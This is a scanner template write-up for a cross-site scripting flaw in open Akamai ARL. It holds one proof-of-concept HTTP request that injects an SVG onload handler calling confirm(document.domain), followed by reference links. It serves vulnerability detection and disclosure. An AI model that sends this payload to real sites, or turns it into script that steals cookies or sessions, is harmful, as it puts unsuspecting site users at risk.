# Nuclei Template: Open Akamai ARL - Cross-Site Scripting
**Template ID:** akamai-arl-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`akamai-arl-xss.yaml`)

## Vulnerability Information & PoC

## Description
Open Akamai ARL contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E
```

## References
- https://github.com/war-and-code/akamai-arl-hack
- https://twitter.com/SpiderSec/status/1421176297548435459
- https://warandcode.com/post/akamai-arl-hack/
- https://github.com/cybercdh/goarl
- https://community.akamai.com/customers/s/article/WebPerformanceV1V2ARLChangeStartingFebruary282021?language=en_US
